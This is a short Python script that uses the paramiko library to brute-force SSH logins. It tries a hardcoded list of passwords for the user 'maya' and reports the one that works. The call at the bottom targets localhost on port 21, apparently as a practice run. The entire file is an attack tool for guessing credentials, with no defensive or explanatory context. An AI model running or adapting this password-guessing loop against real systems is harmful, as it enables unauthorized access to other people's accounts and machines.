import paramiko



def cyberPass(target_host,target_port):

    
    passwords = ['password1', 'password2', 'password3','maya@kill1','mayalo']
    
    client = paramiko.SSHClient()
    
    # automatically add the target host to the list of known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # loop through the list of passwords and try to authenticate with each one
    for password in passwords:
        print(f"trying {password}")
        try:
            # connect to the target host using the specified credentials
            client.connect(target_host, port=target_port, username='maya', password=password)
    
            # if the connection succeeds, print the password and break out of the loop
            print(f"Password found: {password}")
            break
    
        except paramiko.AuthenticationException:
            # if the authentication fails, continue to the next password
            continue
    
        except paramiko.SSHException:
            # if there's an SSH-related error, print an error message and break out of the loop
            # print(f"Error connecting to {target_host}:{target_port}")
            continue
    
    # close the SSH client connection
    client.close()


cyberPass('127.0.0.1', 21)
